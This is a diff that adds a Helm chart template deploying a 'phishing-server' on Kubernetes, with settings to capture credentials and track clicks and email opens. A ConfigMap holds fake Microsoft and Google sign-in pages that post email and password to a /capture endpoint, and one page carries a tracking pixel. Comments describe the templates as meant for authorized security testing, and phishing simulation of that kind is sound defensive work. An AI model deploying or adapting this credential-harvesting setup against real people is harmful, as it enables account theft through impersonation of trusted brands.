@@ -1,0 +1,188 @@
+{{- if .Values.phishingServer.enabled }}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-phishing
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: phishing-server
+spec:
+  replicas: {{ .Values.phishingServer.replicaCount }}
+  selector:
+    matchLabels:
+      {{- include "cloud-relay.selectorLabels" . | nindent 6 }}
+      app.kubernetes.io/component: phishing-server
+  template:
+    metadata:
+      labels:
+        {{- include "cloud-relay.selectorLabels" . | nindent 8 }}
+        app.kubernetes.io/component: phishing-server
+    spec:
+      serviceAccountName: {{ include "cloud-relay.serviceAccountName" . }}
+      securityContext:
+        {{- toYaml .Values.podSecurityContext | nindent 8 }}
+      containers:
+        - name: phishing-server
+          securityContext:
+            {{- toYaml .Values.securityContext | nindent 12 }}
+          image: "{{ .Values.phishingServer.image.repository }}:{{ .Values.phishingServer.image.tag }}"
+          imagePullPolicy: {{ .Values.global.imagePullPolicy }}
+          ports:
+            - name: https
+              containerPort: 8443
+              protocol: TCP
+            - name: metrics
+              containerPort: 9090
+              protocol: TCP
+          env:
+            - name: ENVIRONMENT
+              value: {{ .Values.global.environment }}
+            - name: DOMAIN
+              value: {{ .Values.domain }}
+            - name: LOG_LEVEL
+              value: {{ .Values.logging.level }}
+            # Phishing configuration
+            - name: TEMPLATE_DIR
+              value: /templates
+            - name: CAPTURE_CREDENTIALS
+              value: {{ .Values.phishingServer.captureCredentials | quote }}
+            - name: TRACK_CLICKS
+              value: {{ .Values.phishingServer.trackClicks | quote }}
+            - name: TRACK_OPENS
+              value: {{ .Values.phishingServer.trackOpens | quote }}
+            # Database
+            - name: DB_HOST
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: host
+            - name: DB_PORT
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: port
+            - name: DB_NAME
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: database
+            - name: DB_USER
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: username
+            - name: DB_PASSWORD
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: password
+            # Redis for session tracking
+            - name: REDIS_HOST
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.redis.existingSecret }}
+                  key: host
+            - name: REDIS_PORT
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.redis.existingSecret }}
+                  key: port
+          volumeMounts:
+            - name: templates
+              mountPath: /templates
+              readOnly: true
+          livenessProbe:
+            httpGet:
+              path: /health
+              port: https
+              scheme: HTTPS
+            initialDelaySeconds: 30
+            periodSeconds: 10
+          readinessProbe:
+            httpGet:
+              path: /ready
+              port: https
+              scheme: HTTPS
+            initialDelaySeconds: 5
+            periodSeconds: 5
+          resources:
+            {{- toYaml .Values.phishingServer.resources | nindent 12 }}
+      volumes:
+        - name: templates
+          configMap:
+            name: {{ include "cloud-relay.fullname" . }}-phishing-templates
+            optional: true
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-phishing
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: phishing-server
+spec:
+  type: ClusterIP
+  ports:
+    - port: 443
+      targetPort: https
+      protocol: TCP
+      name: https
+    - port: 9090
+      targetPort: metrics
+      protocol: TCP
+      name: metrics
+  selector:
+    {{- include "cloud-relay.selectorLabels" . | nindent 4 }}
+    app.kubernetes.io/component: phishing-server
+---
+# Default phishing templates ConfigMap
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-phishing-templates
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: phishing-server
+data:
+  microsoft-login.html: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Sign in - Microsoft</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <!-- Template for authorized security testing only -->
+    </head>
+    <body>
+      <div id="login-container">
+        <h1>Sign in</h1>
+        <form method="POST" action="/capture">
+          <input type="email" name="email" placeholder="Email" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <button type="submit">Sign in</button>
+        </form>
+      </div>
+      <script>
+        // Tracking pixel loaded
+        new Image().src = '/track/open?id={{.TrackingID}}';
+      </script>
+    </body>
+    </html>
+  google-login.html: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Sign in - Google</title>
+      <!-- Template for authorized security testing only -->
+    </head>
+    <body>
+      <div id="login-container">
+        <h1>Sign in with Google</h1>
+        <form method="POST" action="/capture">
+          <input type="email" name="email" placeholder="Email" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <button type="submit">Next</button>
+        </form>
+      </div>
+    </body>
+    </html>
+{{- end }}
